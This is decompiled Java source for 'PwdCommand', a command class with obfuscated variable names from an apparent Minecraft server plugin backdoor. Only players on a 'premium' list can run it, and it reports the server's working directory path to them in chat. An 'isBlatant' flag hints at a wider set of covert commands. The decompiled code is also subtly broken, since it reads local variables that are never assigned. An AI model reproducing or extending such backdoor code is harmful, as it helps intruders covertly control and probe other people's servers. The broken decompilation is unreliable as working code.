/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.premium;

import java.io.File;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.FileUtil;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class PwdCommand
extends Command {
    /* synthetic */ File file;

    @Override
    public void execute(Core lllllllllllllllIlIIIllllllIIIlll, String lllllllllllllllIlIIIllllllIIIllI, String[] lllllllllllllllIlIIIllllllIIIlIl, Player lllllllllllllllIlIIIllllllIIIlII) {
        if (lllllllllllllllIlIIIllllllIIIlll.premium.contains(lllllllllllllllIlIIIllllllIIIlII.getName())) {
            PwdCommand lllllllllllllllIlIIIllllllIIIIlI;
            lllllllllllllllIlIIIllllllIIIlII.sendMessage(Settings.PREFIX(lllllllllllllllIlIIIllllllIIIIlI.file.getAbsolutePath()));
        } else {
            lllllllllllllllIlIIIllllllIIIlII.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be a ").append(Settings.RED).append("premium user ").append(Settings.WHITE).append(" to execute this command"))));
        }
    }

    public PwdCommand() {
        PwdCommand lllllllllllllllIlIIIllllllIlIlII;
        lllllllllllllllIlIIIllllllIlIlII.file = FileUtil.getUserDir();
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

